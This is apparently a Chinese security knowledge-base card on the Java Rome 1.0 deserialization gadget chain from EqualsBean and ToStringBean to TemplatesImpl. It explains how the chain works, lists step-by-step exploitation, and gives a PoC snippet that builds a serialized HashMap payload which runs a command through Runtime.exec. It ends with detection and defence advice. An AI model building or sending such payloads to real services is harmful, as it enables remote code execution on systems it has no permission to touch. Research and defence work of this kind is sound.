---
id: web-java-deser-rome-equalsbean-tostringbean-templatesimpl
title: Rome 原生反序列化链：HashMap→EqualsBean.hashCode→ToStringBean.toString 反射 getter→TemplatesImpl.getOutputProperties 加载字节码
type: scenario
domain: web
path: web/java/deserialization
technique: rome-equalsbean-tostringbean-templatesimpl
aliases:
- Rome EqualsBean 链
- ToStringBean TemplatesImpl
- rome 1.0 反序列化
- EqualsBean hashCode toString
- ROME getter 链
- com.sun.syndication.feed.impl
tags:
- java
- deserialization
- gadget
- rome
- tostringbean
- equalsbean
- templatesimpl
- hashmap
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V454
  verified_at: '2026-11-10T02:15:14+08:00'
  notes: 已对照原文核对：HashMap.readObject→putVal(hash(key))→EqualsBean.hashCode→beanHashCode→_obj.toString()→ToStringBean.toString(prefix) 反射 Templates 接口 getter→TemplatesImpl.getOutputProperties；图 01/02/03/05 与卡一致；Templates 接口收窄 getter、构造期 ConstantTransformer 占位后反射替换 _obj 的写法与原文一致；与 vaadin(0.886)/hessian-signedobject(0.887)/jackson 等候选非同链（dedup 建卡前为 new，盘中报告 duplicate 为卡片自身）。未在本机复跑 PoC。
---

## 一句话结论

rome 1.0 提供 `ToStringBean`：其 `toString(prefix)` 会遍历 `_beanClass` 的所有 getter 并在 `_obj` 上反射调用；`EqualsBean.hashCode()` 又直接调用 `_obj.toString().hashCode()`。把 `EqualsBean` 作为 `HashMap` 的 key、`_obj` 设为 `ToStringBean`、再把 `ToStringBean._beanClass` 设为只含 `getOutputProperties` 的 `Templates` 接口、`_obj` 设为填好 `_bytecodes` 的 `TemplatesImpl`，反序列化 `HashMap` 时计算 hashCode 就会一路走到 `TemplatesImpl.getOutputProperties()`，加载并实例化攻击者字节码。

## 原理

- **ToStringBean 的反射 getter 逻辑**：`toString(String prefix)` 中 `BeanIntrospector.getPropertyDescriptors(this._beanClass)` 取得 bean 的属性描述符，对每个有 `getReadMethod()` 的属性执行 `pReadMethod.invoke(this._obj, NO_PARAMS)`。注意“getter 列表来自 `_beanClass`，调用发生在 `_obj` 上”，两个字段可由攻击者分别赋值。
- **为什么用 Templates 接口而不是 TemplatesImpl.class**：`TemplatesImpl` 自身有很多 getter，逐个反射调用会产生大量无用调用甚至异常中断整条链；`javax.xml.transform.Templates` 接口只声明 `newTransformer()` 与 `getOutputProperties()`，把它作为 `_beanClass` 可以把 getter 集合收窄到危险的那一个。
- **危险点**：`TemplatesImpl.getOutputProperties()` → `newTransformer()` → `getTransletInstance()` → `defineTransletClasses()` → `defineClass` 加载 `_bytecodes` 中的 `AbstractTranslet` 子类，静态初始化块/构造器即任意代码。
- **入口 EqualsBean**：`EqualsBean.hashCode()` 返回 `this.beanHashCode()`，而 `beanHashCode()` 的实现是 `this._obj.toString().hashCode()`。构造 `EqualsBean(ToStringBean.class, toStringBean)` 后，`_obj` 是一个 `ToStringBean`，对其调用 `toString()` 即进入上述逻辑。
- **HashMap 为什么触发**：`HashMap.readObject` 把每个键值对重新 `putVal(hash(key), ...)`，计算 `hash(key)` 时调用 `key.hashCode()`，于是 `EqualsBean.hashCode → ToStringBean.toString → TemplatesImpl.getOutputProperties`。
- **构造期的坑**：`HashMap.put` 本身也会计算 hash 并可能调用 equals，如果一开始就把真正的 `ToStringBean`/`TemplatesImpl` 放进去，payload 会在本地构造阶段提前触发。article 的写法是先用 `ConstantTransformer(1)` 占位构造 `ToStringBean`，把 `EqualsBean` 放入 `HashMap` 后，再反射把 `toStringBean._obj` 改成 `TemplatesImpl`，最后才序列化。
- **为什么成立**：Rome 把“对象转字符串”实现成了通用的反射 getter 调用，等于把一个 toString 触发点升级为“任意无参 getter”调用；TemplatesImpl 恰好是 JDK 内经典的字节码加载 sink，两者组合即形成完整的原生反序列化链。

## 触发条件

- 存在 Java 原生反序列化入口（`ObjectInputStream.readObject`）。
- classpath 含 `rome`（`com.sun.syndication.feed.impl.ToStringBean`/`EqualsBean`，示例 rome 1.0）。
- JDK 含可反射写入的 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`（JDK8 环境最直接；高版本需检查模块 opens / 外部 Xalan）。
- 反序列化过滤器未拦截 Rome 的 Bean 类与 `TemplatesImpl`。

## 利用步骤

1. 用 Javassist/ASM 生成继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的类，在静态初始化块中执行命令，得到字节码。
2. 新建 `TemplatesImpl`，反射设置 `_bytecodes = new byte[][]{code}`、`_name`（`_tfactory` 在 JDK8 原生反序列化时会由 `readObject` 重建，也可显式设置）。
3. 构造 `ToStringBean(Templates.class, new ConstantTransformer(1))` 作为占位（避免构造期触发），再构造 `EqualsBean(ToStringBean.class, toStringBean)`。
4. `HashMap.put(equalsBean, "1")`；随后反射把 `toStringBean._obj` 设为第 2 步的 `TemplatesImpl`。
5. 序列化 `HashMap` 并发送到目标入口；目标 `readObject` 重新 put 时经 `EqualsBean.hashCode → ToStringBean.toString → TemplatesImpl.getOutputProperties` 执行字节码。
6. 验证：本地反序列化应弹出计算器/执行命令；若未触发，检查 `TemplatesImpl` 字段是否可写、`_name` 是否为空、过滤器是否拦截 Rome 类。

## PoC

```java
// 关键构造（省略 setFieldValue/序列化工具；未在本机执行）
byte[] code = makeTranslet("Runtime.getRuntime().exec(\"calc\");");   // AbstractTranslet 子类

TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates, "_bytecodes", new byte[][]{code});
setFieldValue(templates, "_name", "Evil");
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

ToStringBean toStringBean = new ToStringBean(Templates.class, new ConstantTransformer(1));
EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

HashMap<Object, Object> map = new HashMap<>();
map.put(equalsBean, "123");               // 此时 _obj 还是无害占位
setFieldValue(toStringBean, "_obj", templates);   // 序列化前换成真 payload

ByteArrayOutputStream barr = new ByteArrayOutputStream();
new ObjectOutputStream(barr).writeObject(map);
// 发送 barr.toByteArray() 到目标反序列化入口
```

## 变体与关联

- [[web-java-deser-rome-spring-hotswappable-xstring-tostringbean-templatesimpl]]：同一下游 sink 的 Spring 触发变体（HotSwappableTargetSource + XString.equals）。
- [[web-java-deser-hessian-dubbo-provider-argument-deserialization-rce]]：同样的 `EqualsBean/ToStringBean` 上游，但下游换成 `JdbcRowSetImpl.getDatabaseMetaData` 触发 JNDI。
- [[web-java-deser-hessian-signedobject-second-order-templates]]：`ToStringBean` 调 `SignedObject.getObject()` 二次反序列化 `TemplatesImpl`。
- [[web-java-deserialization-jdk-xstring-equals-tostring]]：另一种 `toString` 触发原语。
- [[web-java-deserialization-external-xalan-templatesimpl-sink]]：高版本 JDK 下换外部 Xalan TemplatesImpl。
- 变体：`_beanClass` 可换成其他只含危险 getter 的接口/类；下游可换成 JNDI（`JdbcRowSetImpl`）、`SignedObject` 等；Rome 版本不同字段名可能变化。
- 边界：`TemplatesImpl` 被模块强封装/字段不可写、过滤器拦截 Rome 类或 `TemplatesImpl`、目标无原生反序列化入口时链断。

## 检测与防御

- 检测：序列化流中出现 `com.sun.syndication.feed.impl.ToStringBean`/`EqualsBean`、`com.sun.org.apache.xalan...TemplatesImpl`、`Templates` 接口；静态扫描反序列化流量中的高危类名组合；`toString`/`hashCode` 调用栈中出现 `BeanIntrospector.getPropertyDescriptors`。
- 检测：反序列化过滤器/RASP 对 `ToStringBean`、`EqualsBean`、`TemplatesImpl` 及 `AbstractTranslet` 子类做拦截与告警。
- 防御：使用类白名单而非仅黑名单；升级/移除不必要的 Rome 依赖；开启 JEP 290 全局过滤器；对 `TemplatesImpl` 反射写入做模块强封装（JDK17+）。
- 响应：保留原始序列化流作为证据，确认是否已执行命令与外连；排查同入口的其他反序列化攻击。
